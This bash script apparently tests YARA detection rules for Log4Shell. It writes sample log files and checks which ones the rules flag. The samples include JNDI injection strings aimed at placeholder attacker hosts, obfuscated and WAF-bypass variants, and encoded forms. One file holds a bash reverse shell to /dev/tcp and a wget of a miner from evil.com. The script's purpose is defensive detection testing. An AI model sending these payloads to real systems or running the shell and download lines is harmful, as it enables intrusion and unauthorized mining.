#!/bin/bash

echo "=== YARA Rules Testing for Log4Shell Detection ==="
echo ""

# Create test samples directory
mkdir -p /tmp/yara-test-samples
cd /tmp/yara-test-samples

# Create various test files with Log4Shell patterns
echo "[+] Creating test samples..."

# Sample 1: Direct JNDI string
echo 'User-Agent: ${jndi:ldap://attacker.local:1389/Exploit}' > sample1_direct.log

# Sample 2: IP-based JNDI
echo 'GET /?search=${jndi:ldap://10.0.0.8:1389/Exploit} HTTP/1.1' > sample2_ip.log

# Sample 3: Obfuscated JNDI
cat > sample3_obfuscated.log << 'EOF'
X-Api-Version: ${${lower:j}ndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com/Exploit}
User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/Shell}
Cookie: ${${env:BARFOO:-j}ndi:ldap://10.0.0.8:1389/Evil}
EOF

# Sample 4: URL encoded
echo 'GET /?q=%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A1389%2FExploit%7D' > sample4_urlencoded.log

# Sample 5: Base64 encoded
echo 'Authorization: Basic JHtqbmRpOmxkYXA6Ly9hdHRhY2tlci5jb20vRXhwbG9pdH0=' > sample5_base64.log

# Sample 6: Post-exploitation
cat > sample6_postexploit.log << 'EOF'
bash -i >& /dev/tcp/10.0.0.8/4444 0>&1
wget http://evil.com/xmrig
crontab -e
EOF

# Sample 7: Clean file (should not trigger)
echo 'This is a normal log entry without any malicious content' > sample7_clean.log

# Sample 8: Java error with JNDI
cat > sample8_error.log << 'EOF'
2025-01-18 12:21:03,575 main WARN Error looking up JNDI resource [ldap://attacker.local:1389/Exploit].
javax.naming.CommunicationException: attacker.local:1389 [Root exception is java.net.UnknownHostException: attacker.local]
at com.sun.jndi.ldap.LdapCtx.connect(LdapCtx.java:2749)
at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:56)
EOF

# Sample 9: Mixed patterns
cat > sample9_mixed.log << 'EOF'
POST /api/login HTTP/1.1
User-Agent: Mozilla/5.0 ${jndi:ldap://10.0.0.8:1389/Exploit}
Content-Type: application/json

{"username":"admin","password":"${jndi:ldap://127.0.0.1:1389/Shell}"}
EOF

# Sample 10: WAF bypass attempts
cat > sample10_wafbypass.log << 'EOF'
X-Forwarded-For: ${jndi:ldap://10.0.0.8:1389/Exploit}
X-Real-IP: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.com/Shell}
CF-Connecting-IP: ${${env:BARFOO:-j}ndi:${env:BARFOO:-l}dap://attacker.local/Evil}
EOF

echo "[+] Created 10 test samples"
echo ""

# Test with original YARA rules
echo "=== Testing with log4shell.yar ==="
if [ -f "/detection-rules/log4shell.yar" ]; then
    yara -r /detection-rules/log4shell.yar /tmp/yara-test-samples/ 2>/dev/null | while IFS= read -r line; do
        if [[ $line == *"Log4Shell"* ]]; then
            echo "✓ $line"
        fi
    done
else
    echo "[-] log4shell.yar not found in /detection-rules/"
fi

echo ""
echo "=== Testing with log4shell-enhanced.yar ==="
if [ -f "/detection-rules/log4shell-enhanced.yar" ]; then
    yara -r /detection-rules/log4shell-enhanced.yar /tmp/yara-test-samples/ 2>/dev/null | while IFS= read -r line; do
        if [[ $line == *"Log4Shell"* ]]; then
            echo "✓ $line"
        fi
    done
else
    echo "[-] log4shell-enhanced.yar not found in /detection-rules/"
fi

echo ""
echo "=== Detailed Analysis ==="

# Function to test individual files
test_file() {
    local file=$1
    local rule_file=$2
    local filename=$(basename $file)

    echo "Testing: $filename"
    result=$(yara $rule_file $file 2>/dev/null)
    if [ -n "$result" ]; then
        echo "  ✓ DETECTED: $result"
    else
        echo "  ✗ Not detected"
    fi
}

# Test each sample individually with enhanced rules
if [ -f "/detection-rules/log4shell-enhanced.yar" ]; then
    echo ""
    echo "Individual file testing with enhanced rules:"
    for sample in /tmp/yara-test-samples/*.log; do
        test_file "$sample" "/detection-rules/log4shell-enhanced.yar"
    done
fi

echo ""
echo "=== Summary ==="
echo "Expected detections:"
echo "  • sample1_direct.log     - Should detect direct JNDI pattern"
echo "  • sample2_ip.log        - Should detect IP-based JNDI"
echo "  • sample3_obfuscated.log - Should detect obfuscation patterns"
echo "  • sample4_urlencoded.log - Should detect URL encoding"
echo "  • sample5_base64.log    - Should detect Base64 encoding"
echo "  • sample6_postexploit.log - Should detect post-exploitation"
echo "  • sample7_clean.log     - Should NOT detect (clean file)"
echo "  • sample8_error.log     - Should detect JNDI error patterns"
echo "  • sample9_mixed.log     - Should detect mixed patterns"
echo "  • sample10_wafbypass.log - Should detect WAF bypass attempts"

echo ""
echo "=== Testing Complete ==="

# Cleanup option
echo ""
read -p "Remove test samples? (y/n): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    rm -rf /tmp/yara-test-samples
    echo "[+] Test samples removed"
fi